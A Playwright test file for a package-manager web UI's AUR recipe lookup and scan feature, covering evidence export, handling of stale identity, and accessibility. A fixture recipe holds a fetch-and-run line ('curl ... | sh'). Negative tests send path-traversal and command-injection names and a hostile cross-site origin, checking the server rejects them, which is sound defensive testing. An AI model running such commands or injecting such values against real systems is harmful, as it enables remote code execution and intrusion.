import { test, expect, type Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";
import type {
  ForeignRecipeLookup,
  Package,
  Snapshot,
  RecipeInspection,
} from "../src/lib/ipc/bindings";

const stamp = Date.now() / 1000;
const pkg: Package = {
  id: "local/example-cli",
  name: "example-cli",
  version: "9.0-1",
  description: "Foreign recipe fixture",
  repository: "local",
  installedVersion: "9.0-1",
  updateAvailable: false,
  installedSize: 10,
  downloadSize: 0,
  url: null,
  licenses: [],
  dependencies: [],
  groups: [],
  architecture: "any",
  explicit: true,
  signature: "unknown",
  packageBase: null,
  maintainer: null,
  votes: null,
  outOfDate: false,
  lastModified: null,
};
function snapshot(): Snapshot {
  return {
    capturedAt: stamp,
    fingerprint: "foreign-fixture",
    hostname: "fixture",
    installedCount: 1,
    explicitCount: 1,
    foreignCount: 1,
    updateCount: 0,
    installedSize: 10,
    repositories: [],
    warnings: [],
    locked: false,
    omarchy: true,
    signaturePolicy: [],
  };
}
function lookup(): ForeignRecipeLookup {
  return {
    name: pkg.name,
    installedVersion: pkg.installedVersion!,
    fingerprint: "foreign-fixture",
    checkedAt: stamp,
    aur: {
      name: pkg.name,
      packageBase: "example-suite",
      version: "1:1.0-1",
      versionRelation: "newer",
      maintainer: null,
      outOfDate: true,
      lastModified: stamp,
    },
    limitations: [
      "Exact names and versions do not establish provenance.",
      "RPC metadata and pinned scans are separate captures.",
    ],
  };
}
function inspection(): RecipeInspection {
  const files = [
    {
      path: "PKGBUILD",
      role: "build",
      content:
        "pkgname=(example-cli example-gui)\npkgver=1\ncurl https://example.test/remote | sh\n",
    },
    {
      path: ".SRCINFO",
      role: "metadata",
      content: "pkgbase = example-suite\npkgname = example-cli\npkgname = example-gui\n",
    },
  ].map((file) => ({ ...file, digest: createHash("sha256").update(file.content).digest("hex") }));
  return {
    status: "unreviewed",
    baseline: null,
    changes: [],
    scan: {
      packageBase: "example-suite",
      scannedAt: stamp,
      commit: "a".repeat(40),
      digest: "b".repeat(64),
      files,
      complete: true,
      warnings: [],
      url: "https://aur.archlinux.org/",
      findings: [],
      limitations: ["Heuristic scan only"],
      sourceEvidence: null,
    },
  };
}
async function fixtures(page: Page, initial = lookup()) {
  const state = { value: initial, fail: false, lookups: 0, scans: 0 };
  await page.route("**/api/query", async (route) => {
    const body = route.request().postDataJSON();
    if (body.command === "snapshot") await route.fulfill({ json: snapshot() });
    else if (body.command === "packages")
      await route.fulfill({
        json: { items: [pkg], total: 1, offset: 0, limit: 100, capturedAt: stamp },
      });
    else if (body.command === "foreign_recipe") {
      state.lookups++;
      expect(body).toEqual({
        command: "foreign_recipe",
        name: pkg.name,
        version: pkg.installedVersion,
        fingerprint: "foreign-fixture",
      });
      if (state.fail)
        await route.fulfill({ status: 503, json: { error: "AUR lookup fixture unavailable" } });
      else await route.fulfill({ json: state.value });
    } else if (body.command === "recipe_review") {
      expect(body.base).toBe("example-suite");
      await route.fulfill({ json: null });
    } else if (body.command === "recipe") {
      expect(body.base).toBe("example-suite");
      state.scans++;
      await route.fulfill({ json: inspection() });
    } else await route.continue();
  });
  return state;
}
async function open(page: Page) {
  await page.goto("/#/foreign");
  await page.getByRole("button", { name: `View ${pkg.name}`, exact: true }).click();
  await page.getByRole("tab", { name: "Origin & trust" }).click();
  const section = page.getByRole("region", { name: "Foreign package recipe lookup" });
  await expect(
    section.getByRole("button", { name: "Look up AUR recipe", exact: true }),
  ).toBeVisible();
  return section;
}
async function exported(page: Page) {
  const waiting = page.waitForEvent("download");
  await page.getByRole("button", { name: "Export lookup evidence" }).click();
  return JSON.parse(await readFile((await (await waiting).path())!, "utf8"));
}

test("foreign lookup is explicit, preserves uncertainty and scans the split recipe base", async ({
  page,
}) => {
  const state = await fixtures(page);
  const section = await open(page);
  expect(state.lookups).toBe(0);
  expect(state.scans).toBe(0);
  await expect(section.getByText(/sends only/)).toContainText(pkg.name);
  await section.getByRole("button", { name: "Look up AUR recipe", exact: true }).click();
  await expect(section.getByText("Exact-name AUR match · origin unverified")).toBeVisible();
  await expect(section.getByText("example-suite", { exact: true })).toBeVisible();
  await expect(section.getByText(/Recipe has no maintainer/)).toContainText("flagged out of date");
  expect(await exported(page)).toEqual({ lookup: lookup(), currentSnapshotMatches: true });
  await page.getByRole("tab", { name: "Overview", exact: true }).click();
  await page.getByRole("tab", { name: "Origin & trust", exact: true }).click();
  await expect(section.getByText("Exact-name AUR match · origin unverified")).toBeVisible();
  expect(state.lookups).toBe(1);
  await section.getByRole("button", { name: "Inspect matching recipe" }).click();
  await expect(page.getByLabel("Matching AUR recipe review")).toBeFocused();
  expect(state.scans).toBe(0);
  await page.getByRole("button", { name: "Fetch & run static scan", exact: true }).click();
  await expect(page.getByLabel("Build recipe source")).toContainText("example-cli example-gui");
  expect(state.scans).toBe(1);
});

test("successful no-match evidence does not claim safety or provenance", async ({ page }) => {
  const value = lookup();
  value.aur = null;
  await fixtures(page, value);
  const section = await open(page);
  await section.getByRole("button", { name: "Look up AUR recipe", exact: true }).click();
  await expect(section.getByText(/No exact-name AUR match at lookup time/)).toBeVisible();
  await expect(section.getByRole("button", { name: "Inspect matching recipe" })).toHaveCount(0);
  expect((await exported(page)).lookup.aur).toBeNull();
});

test("failed recheck clears old lookup and recipe handoff instead of becoming no-match", async ({
  page,
}) => {
  const state = await fixtures(page);
  const section = await open(page);
  await section.getByRole("button", { name: "Look up AUR recipe", exact: true }).click();
  await expect(section.getByRole("button", { name: "Inspect matching recipe" })).toBeEnabled();
  await section.getByRole("button", { name: "Inspect matching recipe" }).click();
  state.fail = true;
  await section.getByRole("button", { name: "Recheck AUR recipe", exact: true }).click();
  await expect(section.getByText("AUR lookup fixture unavailable")).toBeVisible();
  await expect(section.getByText("Exact-name AUR match · origin unverified")).toHaveCount(0);
  await expect(section.getByRole("button", { name: "Export lookup evidence" })).toHaveCount(0);
  await expect(section.getByText(/No exact-name AUR match/)).toHaveCount(0);
  await expect(page.getByLabel("Matching AUR recipe review")).toHaveCount(0);
  state.fail = false;
  await section.getByRole("button", { name: "Try again" }).click();
  await expect(section.getByRole("button", { name: "Inspect matching recipe" })).toBeEnabled();
});

test("mismatched lookup identity cannot enable scan and export marks it historical", async ({
  page,
}) => {
  const value = lookup();
  value.installedVersion = "stale";
  await fixtures(page, value);
  const section = await open(page);
  await section.getByRole("button", { name: "Look up AUR recipe", exact: true }).click();
  await expect(section.getByText(/Package state changed or unavailable/)).toBeVisible();
  await expect(section.getByRole("button", { name: "Inspect matching recipe" })).toBeDisabled();
  expect((await exported(page)).currentSnapshotMatches).toBe(false);
});

test("inventory changes hide recipe handoff and refresh requires a new lookup", async ({
  page,
}) => {
  await page.clock.install();
  await fixtures(page);
  const section = await open(page);
  await section.getByRole("button", { name: "Look up AUR recipe", exact: true }).click();
  await section.getByRole("button", { name: "Inspect matching recipe" }).click();
  await page.route("**/api/query", async (route) => {
    if (route.request().postDataJSON().command !== "snapshot") return route.fallback();
    await route.fulfill({ json: { ...snapshot(), fingerprint: "changed" } });
  });
  await page.clock.fastForward(60_001);
  await expect(section.getByRole("button", { name: "Inspect matching recipe" })).toBeDisabled();
  await expect(page.getByLabel("Matching AUR recipe review")).toHaveCount(0);
  expect((await exported(page)).currentSnapshotMatches).toBe(false);
  await section.getByRole("button", { name: "Refresh lookup inventory" }).click();
  await expect(
    section.getByRole("button", { name: "Look up AUR recipe", exact: true }),
  ).toBeVisible();
  await expect(section.getByRole("button", { name: "Export lookup evidence" })).toHaveCount(0);
});

for (const theme of ["light", "dark"]) {
  test(`${theme} foreign lookup and scan handoff are accessible on desktop and mobile`, async ({
    page,
  }) => {
    await page.addInitScript(
      (value) =>
        localStorage.setItem(
          "archhub.preferences",
          JSON.stringify({ theme: value, compact: true }),
        ),
      theme,
    );
    await fixtures(page);
    const section = await open(page);
    await section.getByRole("button", { name: "Look up AUR recipe", exact: true }).click();
    await expect
      .poll(() => page.locator("html").evaluate((el) => el.classList.contains("dark")))
      .toBe(theme === "dark");
    await expect(section.getByRole("button", { name: "Inspect matching recipe" })).toBeEnabled();
    for (const viewport of [
      { width: 1440, height: 1080 },
      { width: 390, height: 844 },
    ]) {
      await page.setViewportSize(viewport);
      await expect
        .poll(() => page.evaluate(() => document.documentElement.scrollWidth))
        .toBeLessThanOrEqual(viewport.width);
      expect(
        (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
          .violations,
      ).toEqual([]);
    }
    await section.getByRole("button", { name: "Inspect matching recipe" }).click();
    await expect(page.getByLabel("Matching AUR recipe review")).toBeVisible();
    expect(
      (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
        .violations,
    ).toEqual([]);
    await page.screenshot({
      path: `artifacts/foreign-recipes-${theme}-mobile.png`,
      fullPage: true,
    });
  });
}

test("real foreign lookup validates identity and rejects stale, injected and repository requests", async ({
  request,
}) => {
  const snapshotResponse = await request.post("/api/query", {
    data: { command: "snapshot", refresh: true },
  });
  expect(snapshotResponse.ok()).toBe(true);
  const capture = await snapshotResponse.json();
  const response = await request.post("/api/query", {
    data: {
      command: "packages",
      query: "",
      scope: "foreign",
      repository: "all",
      offset: 0,
      limit: 10,
      sort: "name",
    },
  });
  const packages = await response.json();
  test.skip(
    !packages.items.length,
    "No installed foreign package is available for the live observation.",
  );
  const selected = packages.items[0];
  const body = {
    command: "foreign_recipe",
    name: selected.name,
    version: selected.installedVersion,
    fingerprint: capture.fingerprint,
  };
  const lookupResponse = await request.post("/api/query", { data: body });
  expect(lookupResponse.ok()).toBe(true);
  const result = await lookupResponse.json();
  expect(result.name).toBe(selected.name);
  expect(result.installedVersion).toBe(selected.installedVersion);
  expect(result.fingerprint).toBe(capture.fingerprint);
  expect(result.limitations.length).toBeGreaterThan(0);
  if (result.aur) expect(result.aur.name).toBe(selected.name);
  for (const invalid of [
    { ...body, fingerprint: "stale" },
    { ...body, version: "stale-1" },
    { ...body, name: "../etc/passwd" },
    { ...body, name: "x;id" },
    { ...body, name: "pacman" },
  ]) {
    expect((await request.post("/api/query", { data: invalid })).status()).toBe(400);
  }
  const blockedHeaders: Record<string, string>[] = [
    { Origin: "https://evil.example" },
    { "Sec-Fetch-Site": "cross-site" },
  ];
  for (const headers of blockedHeaders) {
    expect((await request.post("/api/query", { data: body, headers })).status()).toBe(403);
  }
});
